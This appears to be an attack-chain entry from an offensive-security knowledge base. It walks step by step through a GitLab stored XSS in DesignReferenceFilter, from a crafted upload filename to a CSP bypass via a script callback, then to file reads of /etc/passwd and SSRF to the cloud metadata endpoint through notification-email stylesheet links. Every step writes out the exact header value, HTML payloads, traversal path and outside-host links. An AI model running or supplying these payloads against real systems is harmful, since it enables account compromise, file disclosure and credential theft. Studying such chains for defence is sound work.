---
tags:
  - xss
  - stored-xss
  - ssrf
  - file-read
  - gitlab
  - markdown-injection
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
commands: []
platforms:
  - Web
  - GitLab
complexity: medium
procedures:
  - '[[procedures/Upload-Malicious-Design-in-GitLab]]'
  - '[[procedures/Inject-XSS-via-Markdown-Reference]]'
  - '[[procedures/Chain-XSS-to-Arbitrary-File-Read]]'
  - '[[procedures/Chain-XSS-to-SSRF-Attack]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
description: >-
  Multi-stage attack exploiting stored XSS in GitLab's markdown rendering to
  achieve arbitrary JavaScript execution, file reads, and SSRF via email
  notifications
skill_level: intermediate
impact_level: high
id: f8294c0f-f242-4e13-907b-21088476dbeb
created_at: '2025-12-14T00:11:16.708Z'
updated_at: '2025-12-14T00:11:16.708Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
---
# Stored XSS in GitLab DesignReferenceFilter Leading to File Read and SSRF

Multi-stage attack chain demonstrating a complete attack workflow exploiting a stored XSS vulnerability in GitLab's DesignReferenceFilter. The attack begins with uploading a design with a malicious filename to inject attributes into markdown rendering, escalates to arbitrary JavaScript execution by bypassing CSP, and chains to arbitrary file reads and SSRF through email notifications, potentially leaking sensitive credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Upload Malicious Design] --> B[Inject XSS via Markdown]
    B --> C[Chain to File Read]
    C --> D[Chain to SSRF]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- GitLab platform (e.g., gitlab.com)
- Required services: GitLab Issues, Design Management, Email Notifications
- Network access requirements: Access to GitLab web interface and ability to intercept HTTP requests

### Initial Access Requirements

- Credential requirements: Valid GitLab account with project creation permissions
- Network position: External access to GitLab
- Prior access needed: None beyond account creation

## Detailed Attack Procedures

### Step 1: Upload Malicious Design
procedure: [[procedures/Upload-Malicious-Design-in-GitLab]]

**Objective**: Create a project and upload a design with a malicious filename to enable attribute injection.

**Instructions**: Access GitLab and create a new project. Create an issue within the project. Set up [[tools/Burp-Suite]] to intercept the upload request. Initiate the design upload and modify the Content-Disposition header to inject special characters: 'Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png'. Refresh the page to confirm the upload.

**Expected Output**: Design appears with injected filename in the issue.

**Success Indicators**:
- Project and issue created
- Design uploaded with malicious filename visible

### Step 2: Inject XSS via Markdown Reference
procedure: [[procedures/Inject-XSS-via-Markdown-Reference]]

**Objective**: Reference the malicious design in markdown to inject attributes and execute JavaScript.

**Instructions**: Create a new issue with markdown referencing the design: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' vakzz=here </a>. Observe the injected attribute. Create another issue with data attributes: <a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'> ' data-design="1" data-issue="1" data-reference-type="design" data-original=" <script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'></script> " </a>. Save and reload to trigger XSS.

**Expected Output**: Arbitrary JavaScript executes, alerting document.domain.

**Success Indicators**:
- Attribute injection visible in HTML markup
- JavaScript payload executes on page load

### Step 3: Chain to Arbitrary File Read
procedure: [[procedures/Chain-XSS-to-Arbitrary-File-Read]]

**Objective**: Use injected HTML in comments to leak file contents via email notifications.

**Instructions**: Inject HTML with stylesheet links into issue comments: <link rel='stylesheet' href='http://aw.rs/css/a'> <link rel='stylesheet' href='../../../../../../../../../../../etc/passwd'> <link rel='stylesheet' href='http://aw.rs/css/c'>. Trigger email notification and observe leaked file contents inlined in the email via premailer-rails.

**Expected Output**: Contents of targeted file (e.g., /etc/passwd) appear in email CSS.

**Success Indicators**:
- Email notification sent
- File contents leaked in email

### Step 4: Chain to SSRF
procedure: [[procedures/Chain-XSS-to-SSRF-Attack]]

**Objective**: Perform SSRF to access internal metadata services via email notifications.

**Instructions**: Use similar stylesheet injection targeting internal URLs: <link rel='stylesheet' href='http://metadata.google.internal/computeMetadata/v1beta1'>. Trigger email and capture responses from internal services.

**Expected Output**: Internal metadata (e.g., Google Compute Metadata) accessed and potentially leaked.

**Success Indicators**:
- SSRF request successful
- Internal data retrieved via email processing

## Attack Chain Summary

### Key Achievements

1. Stored XSS execution with CSP bypass
2. Arbitrary file read leaking sensitive files
3. SSRF accessing internal services

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]
- [[File and Directory Discovery]]
- [[Unsecured Credentials]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Discovery]]

*Last updated: [TIMESTAMP]*
